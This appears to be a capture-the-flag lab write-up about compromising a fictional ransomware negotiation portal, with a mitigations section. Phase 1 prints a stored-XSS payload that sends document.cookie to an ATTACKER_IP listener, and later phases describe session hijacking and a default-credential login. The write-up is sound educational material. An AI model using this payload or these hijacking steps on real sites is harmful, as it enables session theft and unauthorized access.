# Incident Response: Hexar Ransomware Infrastructure Analysis

## 🎯 Objective
Conduct a proactive investigation into a ransomware attack by infiltrating the attackers' negotiation portal, exploiting vulnerabilities to gain administrative access, and recovering decryption intelligence.

## 🔍 Initial Reconnaissance
- **Victim Artifact:** `READ_ME_HEXAR.txt` ransom note.
- **Threat Intel:** Portal URL (`http://hexar1c2adk0mr1r.hv`) and Victim Device ID (`WIN-KH8L9J0K1L2M`) extracted.
- **First Flag:** Entering the Device ID revealed the Bitcoin payment address.

## 💥 Exploitation Chain

### Phase 1: XSS in Support Chat
- **Vulnerability:** Unrestricted input in chat `message` parameter, accepting `GET` requests.
- **Payload:** `<script>fetch('http://ATTACKER_IP:4444/cookie='+document.cookie)</script>`
- **Result:** Captured admin session cookie (`PHPSESSID`) via a Python HTTP listener.

### Phase 2: Session Hijacking & Pivot
- **Challenge:** Admin panel at `/d3a8f4966_admin/` required the stolen cookie.
- **Solution:** Manual cookie injection via browser console for the root path, then direct navigation to the admin path.
- **Result:** Successful access to the ransomware operator's dashboard.

### Phase 3: Lateral Movement & Data Exfiltration
- **Secondary Tool:** Tiny File Manager at `/d3a8f4966_admin/filemanager/`.
- **Access:** Default credentials (`admin` / `admin@123`).
- **Intel Recovered:** `targets.txt` containing victim list and final flags.

## 🛡️ Mitigation Strategies
1.  **Input Sanitization:** Implement strict output encoding for user-controlled data reflected in chat.
2.  **Cookie Security:** Set the `HttpOnly` and `Secure` flags on all session cookies.
3.  **Authentication Checks:** Enforce `POST` requests for state-changing actions and implement robust anti-CSRF tokens.
4.  **Default Credentials:** Eliminate default logins for ancillary services.

## 📊 Skills Demonstrated
- **Threat Intelligence Gathering:** Extracting IOCs from ransomware notes.
- **Web Vulnerability Exploitation:** Identifying and weaponizing a Stored XSS flaw.
- **Tradecraft:** Session hijacking and pivoting through authenticated interfaces.
- **Incident Response Mindset:** Acting proactively to investigate attacker infrastructure.

*Conducted in a controlled, authorized lab environment for educational purposes.*
